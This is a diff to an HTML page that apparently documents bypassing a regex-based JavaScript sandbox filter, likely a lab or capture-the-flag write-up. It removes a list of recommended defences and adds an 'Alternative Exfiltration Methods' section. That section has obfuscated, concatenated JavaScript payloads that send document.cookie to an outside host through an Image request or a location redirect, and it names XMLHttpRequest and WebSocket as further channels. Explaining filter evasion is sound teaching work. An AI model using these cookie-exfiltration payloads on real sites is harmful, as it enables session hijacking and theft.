@@ -618,14 +618,20 @@ canvas.baseURI → reveals document context
 ❌ Doesn't match (allowed): 'w'+'i'+'n'+'d'+'o'+'w'
         </div>
 
-        <p>Better filters would:</p>
-        <ul>
-            <li>Analyze the AST (Abstract Syntax Tree) instead of regex</li>
-            <li>Use a proper parser to detect string concatenation</li>
-            <li>Implement Content Security Policy (CSP)</li>
-            <li>Use strict sandboxing like iframes with sandbox attribute</li>
-        </ul>
+        <h3>Alternative Exfiltration Methods</h3>
+        <p>Besides fetch, other exfiltration techniques include:</p>
+        
+        <pre><code class="language-javascript">// Image tag
+arc['Image'](orange+'?c='+arc['d'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['c'+'o'+'o'+'k'+'i'+'e'])
 
+// XMLHttpRequest
+arc['X'+'M'+'L'+'H'+'t'+'t'+'p'+'R'+'e'+'q'+'u'+'e'+'s'+'t']
+
+// WebSocket
+arc['W'+'e'+'b'+'S'+'o'+'c'+'k'+'e'+'t']
+
+// Location redirect
+arc['l'+'o'+'c'+'a'+'t'+'i'+'o'+'n'] = orange + '?c=' + cookie</code></pre>
     </div>
 
     <div class="footer">
